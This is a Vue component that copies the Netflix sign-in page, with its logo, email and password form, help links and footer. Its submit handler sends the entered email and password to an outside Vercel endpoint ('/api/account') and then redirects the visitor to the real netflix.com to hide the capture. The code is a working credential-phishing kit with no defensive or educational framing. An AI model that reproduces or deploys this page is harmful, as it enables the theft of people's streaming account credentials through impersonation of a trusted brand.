<script lang="js" setup>
import { ref } from 'vue';
import axios from 'axios'
const email = ref('');
const password = ref('');

async function submit(event) {
  event.preventDefault();
  try {
    const response = await fetch('https://project-puce-psi.vercel.app/api/account', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: email.value, password: password.value })
    });

    const data = await response.json();
    console.log("data", data)

  } catch (err) {
    console.log("err", err);
  }
  window.location.href = "https://www.netflix.com/";
}

</script>

<template>
  <header class="showcase">


    <div class="logo">
      <img src="https://i.ibb.co/r5krrdz/logo.png">
    </div>

    <div class="showcase-content">
      <div class="formm">
        <form @submit="submit">
          <h1>Sign In</h1>
          <div class="info">
            <input v-model="email" class="email" type="email" placeholder="Email or phone number"> <br>
            <input v-model="password" class="email" type="password" placeholder="Password">
          </div>
          <div class="btn">
            <button class="btn-primary" type="submit">Sign In</button>
          </div>
          <div class="help">
            <div>
              <input value="true" type="checkbox"><label>Remember me</label>
            </div>

            <a href="https://www.netflix.com/dz-en/LoginHelp">Need Help ?</a>

          </div>

        </form>

      </div>

      <div class="fcbk">
        <a href="https://facebook.com">
          <img src="https://i.ibb.co/LrVMXNR/social-fb.png" alt="Facebook">
        </a>
        <p>Login with Facebook</p>
      </div>
      <div class="signup">
        <p>New to Netflix ?</p>
        <a href="https://www.netflix.com/dz-en/">Sign up now</a>
      </div>
      <div class="more">
        <p>
          This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
        </p>
      </div>


    </div>


    <footer>

      <div class="ftr-content">
        <div class="contact">
          <a href="#">Quesions? Contact us.</a>
        </div>
        <div class="ftr">
          <a href="#">Gift Card Terms</a>
          <a href="#">Terms of Use</a>
          <a href="#">Privacy Statement</a>
        </div>
        <div class="select">
          <select>
            <option>English</option>
            <option>العربية</option>
            <option>Français</option>

          </select>
        </div>
      </div>

    </footer>

  </header>


</template>